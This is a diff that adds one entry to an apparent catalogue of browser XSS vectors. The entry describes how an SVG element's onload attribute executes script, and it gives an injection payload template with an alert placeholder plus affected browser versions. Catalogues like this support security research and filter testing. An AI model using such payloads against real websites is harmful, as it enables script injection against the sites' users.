@@ -2038,5 +2038,36 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'xxe', 'safari', 'chrome', 'xml', 'entities', 'doctype'],
         'reporter'   : '.mario'
+    },    
+    { /* ID 65 - SVG onload injection without g tag */
+        'id'         : 65,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : 'SVG element allows automatic execution of onload attribute without other SVG elements.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<svg onload="%js_uri_alert%" xmlns="http://www.w3.org/2000/svg"></svg>',        
+        'description': {
+            'en' : 'SVG tags allow code to be executed with onload without any other elements.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'howtofix'   : {
+            'en' : 'Not really a bug to fix, this is desired behaviour and only increases XSS scope.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'chrome': ['4.x'],
+            'safari': ['4.x'],
+			'firefox': ['3.x'],
+			'opera': ['10.x']
+        },
+        'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
+        'reporter'   : 'gareth'
     }
 ]
